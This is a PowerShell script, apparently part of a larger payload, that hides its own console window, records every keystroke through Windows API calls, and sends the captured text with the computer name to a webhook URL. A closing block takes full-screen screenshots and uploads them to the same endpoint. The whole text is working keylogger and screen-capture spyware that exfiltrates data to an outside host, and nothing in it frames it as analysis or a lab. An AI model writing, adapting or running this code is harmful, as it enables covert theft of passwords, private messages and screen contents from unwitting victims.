if ($dc.Ln -ne 121) {
    Write-Host "Shortened Webhook URL Detected.."
    $dc = (irm $dc).url
}

$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle

if($hwnd -ne [System.IntPtr]::Zero){
    $Type::ShowWindowAsync($hwnd, 0)
}
else{
    $Host.UI.RawUI.WindowTitle = 'hideme'
    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
    $hwnd = $Proc.MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0)
}

# Import DLL Definitions for keyboard inputs
$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

# Add stopwatch for intelligent sending
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)

# Start a continuous loop
While ($true){
    $keyPressed = $false
    try{
        # Start a loop that checks the time since the last activity before a message is sent
        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
            # Start the loop with a 30 ms delay between keystate checks
            Start-Sleep -Milliseconds 30
            for ($asc = 8; $asc -le 254; $asc++){
                # Get the key state. (Is any key currently pressed)
                $keyst = $API::GetAsyncKeyState($asc)
                # If a key is pressed
                if ($keyst -eq -32767) {
                    # Restart the inactivity timer
                    $keyPressed = $true
                    $LastKeypressTime.Restart()
                    $null = [console]::CapsLock
                    # Translate the keycode to a letter
                    $vtkey = $API::MapVirtualKey($asc, 3)
                    # Get the keyboard state and create a stringbuilder
                    $kbst = New-Object Byte[] 256
                    $checkkbst = $API::GetKeyboardState($kbst)
                    $logchar = New-Object -TypeName System.Text.StringBuilder
                    # Define the key that was pressed          
                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                        # Check for non-character keys
                        $LString = $logchar.ToString()
                        if ($asc -eq 8) {$LString = "[BKSP]"}
                        if ($asc -eq 13) {$LString = "[ENT]"}
                        if ($asc -eq 27) {$LString = "[ESC]"}
                        # Add the key to the sending variable
                        $send += $LString 
                    }
                }
            }
        }
    }
    finally{
        If ($keyPressed) {
            # Send the saved keys to a webhook
            $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
            $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
            Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
            # Remove the log file and reset the inactivity check 
            $send = ""
            $keyPressed = $false
        }
    }
    # Reset the stopwatch before restarting the loop
    $LastKeypressTime.Restart()
    Start-Sleep -Milliseconds 10
}

$seconds = 30 # Screenshot interval
$a = 1 # Screenshot amount

While ($a -gt 0) {
    $Filett = "$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    Invoke-RestMethod -Uri $dc -Method Post -InFile $Filett -ContentType "multipart/form-data"
    Start-Sleep 1
    Remove-Item -Path $Filett
    Start-Sleep $seconds
    $a--
}